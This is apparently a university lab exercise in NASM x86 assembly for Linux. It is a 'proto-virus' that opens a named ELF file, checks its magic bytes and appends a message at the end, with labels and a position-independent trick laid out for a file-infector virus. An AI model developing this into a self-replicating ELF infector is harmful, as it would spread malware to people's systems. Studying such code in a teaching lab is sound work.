%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
;my defines

%define STDOUT		1
%define FD dword [ebp-4]
%define ELF_header ebp-56
%define FIleSize dword [ebp-60]
%define original_entry_point ebp-64

	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
open_file:
	call get_my_loc
	sub ecx, next_i-FileName
	mov eax, ecx
	open eax, RDWR, 0x777
	cmp eax, -1
	jle fail
	mov edi, eax	; edi = eax = fd

check_magic:
	read edi, ebp, 4
	cmp eax, -1	;check error
	mov ecx, ebp
	jle fail	;eax >= -1
	cmp dword[ecx], 0x464C457F
	jne fail

infect:
	; go to the end of the file
	lseek edi, 0, SEEK_END
	cmp eax, -1
	jle fail
	write edi, OutStr, 30
	cmp eax, -1
	jle fail
	
print_success:
		write 1, OutStr, 31

fail:
		call get_my_loc
		sub ecx, next_i-Failstr
		write 2, ecx, 12
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
FailOpen:   	db "error in openning", 10 , 0
FailNotELF: 	db "error not an elf", 10 , 0

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:
